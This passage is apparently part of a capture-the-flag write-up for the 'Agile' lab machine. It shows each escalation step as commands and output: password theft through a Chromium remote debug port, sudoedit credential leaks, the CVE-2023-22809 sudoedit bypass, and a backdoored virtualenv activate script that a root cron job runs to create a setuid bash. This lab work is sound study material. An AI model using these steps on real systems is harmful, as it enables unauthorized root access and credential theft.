not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47
corum@agile:~$
```

### HTTP connection to localhost

![](attachments/agile_10.png)

Yup, I can open the similar-looking web page as `superpass.htb` from `localhost:5555`.
I tested the application thoroughly, and found out that it doesn't have LFI vulnerability unlike the original app.

I think I have to take a look at the debug port.
Based on `linPEAS`, `--remote-debug-port` is `41829`.
Let's open a SSH tunnel first.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh -L 41829:127.0.0.1:41829 corum@10.10.11.203
corum@10.10.11.203's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Sat Nov 30 12:21:08 2024 from 10.10.14.14
corum@agile:~$ 
```

Then, let's open `Chromium` and set a debug port.

![](attachments/agile_11.png)

Then, I can open `Inspect` button and see the following;

![](attachments/agile_12.png)

This reveals `edwards`'s password : `d07867c6267dcb5df0af`.

```bash
corum@agile:/tmp$ su edwards
su edwards
Password: d07867c6267dcb5df0af

edwards@agile:/tmp$ id
id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
```

Now I have `edwards` shell.


# Shell as `root`

### Enumeration

```bash
edwards@agile:~$ sudo -l
sudo -l
[sudo] password for edwards: d07867c6267dcb5df0af

Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

### Leaking passwords using sudoedit

`sudo -l` command finds out that `edwards` can run 2 command lines as `dev_admin`.
Let's run those commands.

```bash
edwards@agile:~$ sudoedit -u dev_admin /app/config_test.json

{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@loc>
}
```

It reveals another credential for `superpasstester` : `VUO8A2c2#3FnLq3*a9DX1U`
Let's use this credential to enumerate `mysql` again.

```sql
edwards@agile:~$ mysql -u superpasstester -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 120
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpasstest      |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpasstest;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------+
| Tables_in_superpasstest |
+-------------------------+
| passwords               |
| users                   |
+-------------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
+----+---------------------+---------------------+---------+------------+----------------------+---------+
| id | created_date        | last_updated_data   | url     | username   | password             | user_id |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
|  1 | 2023-01-25 01:10:54 | 2023-01-25 01:10:54 | agile   | edwards    | d07867c6267dcb5df0af |       1 |
|  2 | 2023-01-25 01:14:17 | 2023-01-25 01:14:17 | twitter | dedwards__ | 7dbfe676b6b564ce5718 |       1 |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
2 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | edwards  | $6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0 |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

I think the informations found are all I already found.

```bash
edwards@agile:~$ sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt

edwards:1d7ffjwrx#$d6qn!9nndqgde4
```

Another credential for `edwards` : `1d7ffjwrx#$d6qn!9nndqgde4`

### sudoedit bypass privesc

Since the command is `sudoedit`, I can find an related article;
https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
And here's the exploit-db PoC code:
https://www.exploit-db.com/exploits/51217
It says that the it should be working when the `sudo`'s version is between `1.8.0` and `1.9.12p1`

```bash
edwards@agile:~$ sudo --version
sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Luckily, this machine's `sudo` version is in that range.
However, still the PoC code is not doable since `edwards` only have permission to `dev_admin` not `root` while the PoC code is trying to edit `/etc/sudoers` file.
We need to find a file accessible by `dev_admin`.

```bash
edwards@agile:~$ find / -user dev_admin 2>/dev/null
/home/dev_admin
/app/app-testing/tests/functional/creds.txt
/app/config_test.json
/app/config_prod.json
edwards@agile:~$ find / -group dev_admin 2>/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

With `dev_admin` group permission, there are interesting files in `/app/venv/bin` directory.
`activate` file is commonly used in python virtual environment.

Also, let's run `pspy64` to monitor if there's any process using `activate` runs repeatedly.

```ruby
edwards@agile:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     


<SNIP>
2024/11/30 17:08:10 CMD: UID=1001  PID=29135  | /bin/bash /app/test_and_update.sh                                                                     
2024/11/30 17:08:10 CMD: UID=1001  PID=29130  | /bin/sh -c /app/test_and_update.sh           

2024/11/30 17:09:01 CMD: UID=1001  PID=29333  | /bin/bash /app/test_and_update.sh       

2024/11/30 17:10:01 CMD: UID=1001  PID=29342  | /bin/sh -c /app/test_and_update.sh                                                                    
2024/11/30 17:10:01 CMD: UID=1001  PID=29349  | /bin/bash /app/test_and_update.sh                                                                     
2024/11/30 17:10:01 CMD: UID=1001  PID=29348  | /bin/bash /app/test_and_update.sh      
```

It looks like `/app/test_and_update.sh` is running every minute.

Let's take a look at what's in it.

```bash
edwards@agile:/app$ cat test_and_update.sh 
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

Bingo! `test_and_update.sh` file contains `source /app/venv/bin/activate`.
If we edit this file, probably we can run any command as `root`.

```bash
edwards@agile:/app$ EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config_test.json
[sudo] password for edwards: 
3 files to edit
sudoedit: -- unchanged
sudoedit: /app/config_test.json unchanged


# EDIT /app/venv/bin/activate!!!

# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

# I added 2 lines below!!!
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
##########################

deactivate () {
    # reset old environment variables
    if [ -n "${_OLD_VIRTUAL_PATH:-}" ] ; then
        PATH="${_OLD_VIRTUAL_PATH:-}"

```

It's successful to open editing `/app/venv/bin/activate`.
I added `rootbash` command line at the top.
Then, let's wait for a while for the code to run.

```bash
edwards@agile:/tmp$ ls
attachments
completed
new
pending
rootbash

edwards@agile:/tmp$ ./rootbash -p

edwards@agile:/tmp# whoami
root

edwards@agile:/tmp# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) egid=0(root) groups=0(root),1002(edwards)
```

I got succeed to get a `root` shell!